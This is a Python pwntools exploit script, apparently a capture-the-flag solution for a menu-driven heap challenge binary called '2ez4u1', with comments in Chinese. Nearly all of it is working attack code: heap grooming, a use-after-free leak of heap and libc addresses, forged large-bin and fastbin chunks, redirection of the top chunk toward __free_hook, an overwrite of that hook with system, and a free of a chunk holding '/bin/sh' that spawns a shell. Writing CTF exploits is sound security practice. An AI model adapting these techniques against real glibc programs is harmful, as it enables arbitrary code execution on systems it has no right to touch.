#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './2ez4u1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so.6')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = [0xD59,0xE2C]
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('5. quit\n')
    p.recvuntil('your choice: ')

def create(size, content, val=0, num=0, col=0):
    eat()
    p.sendline('1')
    p.recvuntil('color?(0:red, 1:green):')
    p.sendline(str(col))
    p.recvuntil('value?(0-999):')
    p.sendline(str(val))
    p.recvuntil('num?(0-16):')
    p.sendline(str(num))
    p.recvuntil('description length?(1-1024):')
    p.sendline(str(size))
    p.recvuntil('apple:')
    p.send(content)

def delete(index):
    eat()
    p.sendline('2')
    p.recvuntil('which?(0-15):')
    p.sendline(str(index))

def edit(index, content,val=1000, num=17, col=3):
    eat()
    p.sendline('3')
    p.recvuntil('which?(0-15):')
    p.sendline(str(index))
    p.recvuntil('color?(0:red, 1:green):')
    p.sendline(str(col))
    p.recvuntil('value?(0-999):')
    p.sendline(str(val))
    p.recvuntil('num?(0-16):')
    p.sendline(str(num))
    p.recvuntil('new description of the apple:')
    p.send(content)

def show(index):
    eat()
    p.sendline('4')
    p.sendline(str(index))

# 布局要注意 \x00 和 consolidate,malloc 也会 consolidate。。。
create(0x10,'1\n')# 0
create(0x20,'1\n')# 1 unlink_ptr
create(0x3e0,'largebin\n')# 2 有\x00截断。。。。,heap_base 是 \x00 结尾的 0x400
create(0x30,'1\n')# 3
create(0x3f0,'largebin\n')# 4 0x410
create(0x40,'1\n')# 5
create(0x50,'1\n')# 6 fake_large
create(0x80,'1\n')# 7 small
create(0x70,'1\n')# 8
create(0x80,'1\n')# 9 small
create(0x50,'1\n')# 10
create(0x60,'1\n')# 11
create(0x200,'1\n')# 12 伪造 prev_size,过 malloc 检查

# 使两个 large 进 large_bin，泄露 heap_addr
delete(2)# 0x400
delete(4)# 0x410
delete(0)# 不然之后就把2 占用了，uaf就没了

create(0x400,'a\n')# 0

show(2)
p.recvuntil('iption:')
heap_base = u64(p.recvuntil('\n',drop = 'True').ljust(8,b'\x00'))-0x4c0
log.success('heap_base: ' + hex(heap_base))


# leak_libc
# 利用 overlap chunk 使伪造的 large_chunk 包含 small_chunk
unlink_ptr = heap_base + 0x40 + 0x18
fake_large_addr = heap_base + 0x940 + 0x10
fake_large = p64(0x411) + p64(unlink_ptr-0x18) + p64(unlink_ptr-0x10)[:-1] + b'\n' #一样大小，另一个成为堆头，这个之后可以申请出来
log.success('unlink_addr: ' + hex(unlink_ptr))
log.success('fake_large: ' + hex(fake_large_addr))# 0x555555605950

edit(1,p64(fake_large_addr) + b'\n')

edit(6,fake_large)

edit(12, 0xd8*b'a'+p64(0x410)+p64(0x71)[:-1]+b'\n')# 伪造 prve_size

edit(2, p64(fake_large_addr)[:-1] + b'\n')# 伪造 bk_nextsize

delete(9)# 先出

delete(7)# overlap

delete(0)

small_addr = heap_base + 0xad0
create(0x3f0, b'a'*0x38+p64(small_addr)[:-1]+b'\n')# 0 p64(small_addr)维持原来的 fd 且绕过\x00

real_large_addr = heap_base + 0x4c0
edit(2, p64(real_large_addr)[:-1] + b'\n')# 修复 bk_nextsize
create(0x80,'a\n')# 2 将一个 small_chunk 申请出来，那 bin 中就只剩下一个 small_chunk

show(0)
p.recvuntil('a' * 0x38)
libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x3c4c08
log.success('libc.address: ' + hex(libc.address))

edit(0, b'a'*0x30+p64(0xa1)[:-1]+b'\n')# 恢复之前覆盖掉的 size，方便调试

# 改 top 指针指向 free_hookxx
free_hook = libc.symbols['__free_hook']
system_addr = libc.symbols['system']
log.success('free_hook: ' + hex(free_hook))

free_hookxx = free_hook-0xb58 # 该区域有大数，可以当做 top 的 size
log.success('free_hookxx: ' + hex(free_hookxx))

main_arena = 0x3c4b20 + libc.address
log.success('main_arena: ' + hex(main_arena))

fake_fastbin = 0x3c4b20 + libc.address + 0x30 # 0x70
log.success('fake_fastbin: ' + hex(fake_fastbin))

# 伪造 fastbin 0x70 0x80 的 bin
delete(10)# 0x70
delete(11)# 0x80

payload = b'a'*0x28 + p64(0) + p64(0xa1) + b'a'*0x90 + p64(0xa0) + p64(0x90) + b'a'*0x80 + p64(0) + p64(0xa1) + b'a'*0x90
payload += p64(0) + p64(0x71) + p64(fake_fastbin) + p64(0) + b'a'*0x50 + p64(0) + p64(0x81) + p64(0x71)[:-1] + b'\n'
edit(0, payload)

create(0x50,'1\n')# 4
create(0x60,'1\n')# 7

create(0x50,'1\n')# 9
edit(9, p64(free_hookxx)[:-1]+b'\n')

#当去 malloc 一个大于 smallbin 的 chunk 时, 将 fastbin 中的 chunk 都整理到 unsortedbin 中,千万不能，因为 fastbin 被改了
create(0x3d0,'1\n')# 10 没有修复 bk_nextsize 这里就会 crash
create(0x3d0,'1\n')# 11

create(0x3d0,'1\n')# 13
create(0x3d0,'1\n')# 14

create(0x3d0,b'\x00'*0x350 + p64(system_addr)[:-1]+b'\n')# 15

payload = b'a'*0x28 + p64(0) + p64(0xa1) + b'a'*0x90 + p64(0xa0) + p64(0x90) + b'/bin/sh\n'
edit(0, payload)
delete(8)

p.interactive()
